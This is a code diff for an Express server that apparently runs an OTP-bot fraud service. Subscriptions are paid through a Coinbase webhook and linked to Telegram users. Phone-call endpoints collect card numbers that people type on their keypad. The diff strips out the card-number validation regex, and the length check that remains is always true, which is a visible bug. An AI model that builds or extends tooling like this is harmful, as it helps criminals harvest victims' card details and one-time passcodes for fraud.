@@ -40,7 +40,7 @@ app.post('/coinbase-webhook', async (req, res) => {
     );
 
     const { metadata, pricing } = body.event.data;
-    const subsciption = getMembership(pricing.local.amount);
+    const subsciption = getMembership(String(pricing.local.amount));
 
     if (event.type === 'charge:pending' && metadata.reason === 'OTP Purchase') {
       // user paid, but transaction not confirm on blockchain yet
@@ -89,7 +89,7 @@ app.post('/coinbase-webhook', async (req, res) => {
           fields: {
             id: { 'en-US': Date.now() },
             telegramId: { 'en-US': Number(metadata.chatId) },
-            username: { 'en-US': metadata.username },
+            username: { 'en-US': metadata.username || String(metadata.chatId) },
             membershipExpiry: {
               'en-US': moment
                 .utc()
@@ -583,12 +583,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
   }
 
   if (isAccount === 'yes') {
-    if (
-      (dtmf.length >= 15 || dtmf.length <= 16) &&
-      !/^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/.test(
-        dtmf,
-      )
-    ) {
+    if (dtmf.length >= 15 || dtmf.length <= 16) {
       return res.json({
         id: uuidv4(),
         title: `pay card - ${chatId} OTP`,
@@ -1176,12 +1171,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
         });
       }
     case 'card':
-      if (
-        (dtmf.length >= 15 || dtmf.length <= 16) &&
-        !/^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/.test(
-          dtmf,
-        )
-      ) {
+      if (dtmf.length >= 15 || dtmf.length <= 16) {
         return res.json({
           id: uuidv4(),
           title: `pay card - ${chatId} OTP`,
